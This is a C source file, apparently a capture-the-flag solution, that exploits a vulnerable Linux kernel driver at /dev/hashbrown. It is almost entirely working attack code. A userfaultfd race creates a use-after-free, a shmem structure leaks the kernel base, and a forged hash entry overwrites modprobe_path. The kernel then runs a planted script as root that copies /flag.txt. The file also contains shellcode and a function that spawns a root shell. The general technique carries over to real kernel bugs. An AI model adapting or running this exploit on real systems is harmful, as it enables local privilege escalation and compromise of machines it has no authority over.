#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>


// commands
#define DEV_PATH "/dev/hashbrown"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
// (END utils)

// consts
#define SIZE_ARR_START 0x10

// globals
#define STATE_LEAK 0
#define STATE_UAF 1
#define STATE_INVALID 99
void *uffdaddr = NULL;
pthread_t uffdthr; // ID of thread that handles page fault and continue exploit in another kernel thread
int hashfd = -1;
uint STATUS = STATE_LEAK;
uint targetkey = SIZE_ARR_START * 3 / 4 - 1;
uint limit = SIZE_ARR_START;
uint threshold = SIZE_ARR_START * 3/ 4;
char *faultsrc = NULL;
// (END globals)

/*** hashbrown ****/
// commands
#define ADD_KEY 0x1337
#define DELETE_KEY 0x1338
#define UPDATE_VALUE 0x1339
#define DELETE_VALUE 0x133a
#define GET_VALUE 0x133b
// returns
#define INVALID 1
#define EXISTS 2
#define NOT_EXISTS 3
#define MAXED 4

// structs
typedef struct{
    uint32_t key;
    uint32_t size;
    char *src;
    char *dest;
}request_t;
struct hash_entry{
    uint32_t key;
    uint32_t size;
    char *value;
    struct hash_entry *next;
};
typedef struct
{
    uint32_t size;
    uint32_t threshold;
    uint32_t entry_count;
    struct hash_entry **buckets;
}hashmap_t;
uint get_hash_idx(uint key, uint size)
{
    uint hash;
    key ^= (key >> 20) ^ (key >> 12);
    hash = key ^ (key >> 7) ^ (key >> 4);
    return hash & (size - 1);
}

// wrappers
void add_key(int fd, uint key, uint size, char *data){
  printf("[+] add_key: %d %d %p\n", key, size, data);
  request_t req = {
    .key = key,
    .size = size,
    .src = data
  };
  long ret = ioctl(fd, ADD_KEY, &req);
  assert(ret != INVALID && ret != EXISTS);
}
void delete_key(int fd, uint key){
  printf("[+] delete_key: %d\n", key);
  request_t req = {
    .key = key
  };
  long ret = ioctl(fd, DELETE_KEY, &req);
  assert(ret != NOT_EXISTS && ret != INVALID);
}
void update_value(int fd, uint key, uint size, char *data){
  printf("[+] update_value: %d %d %p\n", key, size, data);
  request_t req = {
    .key = key,
    .size = size,
    .src = data
  };
  long ret = ioctl(fd, UPDATE_VALUE, &req);
  assert(ret != INVALID && ret != NOT_EXISTS);
}
void delete_value(int fd, uint key){
  printf("[+] delete_value: %d\n", key);
  request_t req = {
    .key = key,
  };
  long ret = ioctl(fd, DELETE_VALUE, &req);
  assert(ret != NOT_EXISTS);
}
void get_value(int fd, uint key, uint size, char *buf){
  printf("[+] get_value: %d %d %p\n", key, size, buf);
  request_t req = {
    .key = key,
    .size = size,
    .dest = buf
  };
  long ret = ioctl(fd, GET_VALUE, &req);
  assert(ret != NOT_EXISTS && ret != INVALID);
}

/**** (END hashbrown) ****/

// userfaultfd-utils
static void* fault_handler_thread(void *arg)
{
  puts("[+] entered fault_handler_thread");

  static struct uffd_msg msg;   // data read from userfaultfd
  struct uffdio_copy uffdio_copy;
  long uffd = (long)arg;        // userfaultfd file descriptor
  struct pollfd pollfd;         //
  int nready;                   // number of polled events
  int shmid;
  void *shmaddr;

  // set poll information
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  // wait for poll
  puts("[+] polling...");
  while(poll(&pollfd, 1, -1) > 0){
    if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      errExit("poll");

    // read an event
    if(read(uffd, &msg, sizeof(msg)) == 0)
      errExit("read");

    if(msg.event != UFFD_EVENT_PAGEFAULT)
      errExit("unexpected pagefault");

    printf("[!] page fault: 0x%llx\n",msg.arg.pagefault.address);

    // Now, another thread is halting. Do my business.
    switch(STATUS){
      case STATE_LEAK:
        if((shmid = shmget(IPC_PRIVATE, PAGE, 0600)) < 0)
          errExit("shmget");
        delete_value(hashfd, targetkey);
        if((shmaddr = shmat(shmid, NULL, 0)) < 0)
          errExit("shmat");
        STATUS = STATE_UAF;
        break;
      case STATE_UAF:
        delete_value(hashfd, targetkey);
        STATUS = STATE_INVALID;
        break;
      default:
        errExit("unknown status");
    }

    printf("[+] uffdio_copy.src: %p\n", faultsrc);
    uffdio_copy.src = (ulong)faultsrc;
    uffdio_copy.dst = (ulong)msg.arg.pagefault.address & ~(PAGE - 1);
    uffdio_copy.len = PAGE;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
      errExit("ioctl-UFFDIO_COPY");
    else{
      puts("[+] end ioctl(UFFDIO_COPY)");
    }

    break;
  }

  puts("[+] exiting fault_handler_thrd");
}

pthread_t register_userfaultfd_and_halt(void)
{
  puts("[+] registering userfaultfd...");

  long uffd;      // userfaultfd file descriptor
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  int s;

  // create userfaultfd file descriptor
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // there is no wrapper in libc
  if(uffd == -1)
    errExit("userfaultfd");

  // enable uffd object via ioctl(UFFDIO_API)
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    errExit("ioctl-UFFDIO_API");

  // mmap
  puts("[+] mmapping...");
  uffdaddr = mmap((void*)FAULT_ADDR, PAGE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr.
  printf("[+] mmapped @ %p\n", uffdaddr);
  if(uffdaddr == MAP_FAILED)
    errExit("mmap");

  // specify memory region handled by userfaultfd via ioctl(UFFDIO_REGISTER)
  uffdio_register.range.start = (ulong)uffdaddr;
  uffdio_register.range.len = PAGE;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    errExit("ioctl-UFFDIO_REGISTER");

  s = pthread_create(&uffdthr, NULL, fault_handler_thread, (void*)uffd);
  if(s!=0){
    errno = s;
    errExit("pthread_create");
  }

  puts("[+] registered userfaultfd");
  return uffdthr;
}
// (END userfaultfd-utils)

/******** MAIN ******************/

int main(int argc, char *argv[]) {
  char buf[0x200];
  faultsrc = mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  memset(buf, 0, 0x200);
  hashfd = open(DEV_PATH, O_RDONLY);
  assert(hashfd > 0);

  // race-1: leak via shm_file_data
  for(int ix=0; ix!=threshold; ++ix){
    add_key(hashfd, ix, 0x20, buf);
  }
  register_userfaultfd_and_halt();
  add_key(hashfd, threshold, 0x20, uffdaddr);
  limit <<= 2;
  threshold = limit * 3 / 4;
  pthread_join(uffdthr, 0);

  // leak kernbase
  get_value(hashfd, targetkey, 0x20, buf);
  printf("[!] %lx\n", ((ulong*)buf)[0]);
  printf("[!] %lx\n", ((ulong*)buf)[1]);
  printf("[!] %lx\n", ((ulong*)buf)[2]);
  printf("[!] %lx: shmem_vm_ops\n", ((ulong*)buf)[3]);
  const ulong shmem_vm_ops = ((ulong*)buf)[3];
  const ulong kernbase = shmem_vm_ops - ((ulong)0xffffffff8b622b80 - (ulong)0xffffffff8ae00000);
  const ulong modprobe_path = kernbase + ((ulong)0xffffffffb0c46fe0 - (ulong)0xffffffffb0200000);
  printf("[!] kernbase: 0x%lx\n", kernbase);
  printf("[!] modprobe_path: 0x%lx\n", modprobe_path);

  // race-2: retrieve hash_entry as value
  targetkey = threshold - 1;
  memset(buf, 'A', 0x20);
  for(int ix=SIZE_ARR_START * 3/4 + 1; ix!=threshold; ++ix){
    add_key(hashfd, ix, 0x20, buf);
  }
  register_userfaultfd_and_halt();
  add_key(hashfd, threshold, 0x20, uffdaddr);
  pthread_join(uffdthr, 0);
  for(int ix=threshold+1; 1==1; ++ix){ // find my cute object
    memset(buf, 'A', 0x20);
    add_key(hashfd, ix, 0x20, buf);
    get_value(hashfd, targetkey, 0x20, buf);
    if(((uint*)buf)[0] != 0x41414141){
      printf("[!] GOT kUAFed object!\n");;
      printf("[!] %lx\n", ((ulong*)buf)[0]);
      printf("[!] %lx\n", ((ulong*)buf)[1]);
      printf("[!] %lx\n", ((ulong*)buf)[2]);
      printf("[!] %lx\n", ((ulong*)buf)[3]);
      break;
    }
  }

  // forge hash_entry as data and overwrite modprobe_path
  struct hash_entry victim = {
    .key = ((uint*)buf)[0],
    .size = ((uint*)buf)[1],
    .value = modprobe_path,
    .next = NULL
  };
  update_value(hashfd, targetkey, 0x20, &victim);
  update_value(hashfd, ((uint*)buf)[0], 0x20, "/home/ctf/nirugiri.sh\x00\x00\x00\x00");

  // trigger modprobe_path
  system("echo -ne '#!/bin/sh\n/bin/cp /flag.txt /home/ctf/flag.txt\n/bin/chmod 777 /home/ctf/flag.txt' > /home/ctf/nirugiri.sh");
  system("chmod +x /home/ctf/nirugiri.sh");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /home/ctf/puipui-molcar");
  system("chmod +x /home/ctf/puipui-molcar");
  system("/home/ctf/puipui-molcar");

  // NIRUGIRI it
  system("cat /home/ctf/flag.txt");

  return 0;
}
